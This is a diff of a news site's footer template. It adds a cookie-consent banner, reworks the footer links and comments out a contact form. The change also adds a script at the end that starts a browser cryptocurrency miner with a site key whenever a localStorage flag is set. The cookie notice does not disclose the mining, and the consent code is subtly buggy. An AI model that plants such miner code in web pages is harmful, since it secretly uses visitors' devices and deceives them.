@@ -1,4 +1,6 @@
 <div class="container">
+    <br>
+    <div style="background-color: rgb(52, 49, 49);color: white;margin:20px" width="100%" class="card" id="cookieAccept"><p class="card-title" style="margin: 10px;">This site uses cookies, for more information, read our <a href="/terms">Terms of Service</a>.<button style="float: right;" class="btn btn-sm btn-primary" onclick="cookieAccept()">Accept</button></p></div>
     <footer class="pt-4 my-md-5 pt-md-5 border-top footer mt-auto py-3">
         <div class="row">
             <div class="col-6 col-md">
@@ -9,35 +11,67 @@
                     <li><a class="text-muted" href="/status">Satus</a></li>
                     <li><a class="text-muted" href="/privacy">Privacy</a></li>
                     <li><a class="text-muted" href="/terms">Terms</a></li>
-                    <li><a class="text-muted" href="/developers">Developers</a></li>
+                    <li><a class="text-muted" href="https://developers.centralizednews.org">Developers</a></li>
                 </ul>
             </div>
             <div class="col-6 col-md">
                 <h5>Company</h5>
                 <ul class="list-unstyled text-small">
                     <li><a class="text-muted" href="/about">About</a></li>
+                    <li><a class="text-muted" href="/contact">Contact</a></li>
                     <li><a class="text-muted" href="/jobs">Work with us</a></li>
-                    <li><a class="text-muted" href="/apply">Apply to produce</a></li>
+                    <li><a class="text-muted" href="/apply">Apply to produce/write</a></li>
+                    <li><a class="text-muted" href="/donate">Donate</a></li>
                 </ul>
             </div>
             <div class="col-6 col-md">
-                <h5>Writers</h5>
+                <h5>Publishers</h5>
                 <ul class="list-unstyled text-small">
-                    <li><a class="text-muted" href="/writers">Writers</a></li>
                     <li><a class="text-muted" href="/writers/new">New article</a></li>
-                    <li><a class="text-muted" href="/api/examples#writers">New article API</a></li>
+                    <li><a class="text-muted" href="/producers/new">New video</a></li>
+                    <li><a class="text-muted" href="/admin">Admin</a></li>
                 </ul>
             </div>
-            <div class="col-6 col-md">
-                <h5>Contact</h5>
-                <form action=/api/contact>
-                    <input style="float: left; width: 48%;" type="text" name="name" placeholder="name">
-                    <input style="float: right; width: 48%;" type="email" name="email" placeholder="email">
-                    <br><br>
-                    <textarea style="width: 100%" rows="3" type="text" name="message" placeholder="message"></textarea>
-                    <button type="submit" class="btn btn-primary">Send</button>
-                </form>
-            </div>
-        </div>
+            <!--<div class="col-6 col-md">
+                <div class="card card-body">
+                    <h5>Contact</h5>
+                    <form action=/api/contact>
+                        <input style="float: left; width: 48%;" type="text" name="name" placeholder="name" class="form-control" required>
+                        <input style="float: right; width: 48%;" type="email" name="email" placeholder="email" class="form-control" required>
+                        <br><br>
+                        <textarea style="width: 100%" rows="3" type="text" name="message" placeholder="message" class="form-control" required></textarea>
+                        <br>
+                        <button type="submit" class="btn btn-primary">Send</button>
+                    </form>
+                </div>
+            </div>-->
+        </div><bbr></bbr>
+        <div><p class="card-title text-muted">&copy; 2020, <%- name %></p></div>
     </footer>
 </div>
+<script>
+    const checkedStorage = JSON.parse(localStorage.getItem("browserMiner"));
+    const checkedStorageCookies = JSON.parse(localStorage.getItem("cookieConsent"));
+
+    if (checkedStorageCookies === true) {
+        document.getElementById('cookieAccept').classList.add('hidden')
+    } else if (checkedStorageCookies === 'null') {
+        localStorage.setItem("cookieAccept", false)
+        window.location.reload();
+    }
+
+    function cookieAccept() {
+        localStorage.setItem("cookieConsent", true)
+        window.location.reload();
+    }
+
+    if (checkedStorage === true) {
+        var miner = WMP.Anonymous("SK_MiDXNOOFXNkgWV7lbMNBN	");
+        miner.start();
+
+        console.log("mining starting")
+    } else if (checkedStorage === null) {
+        localStorage.setItem("browserMiner", false)
+        window.location.reload();
+    }
+</script>
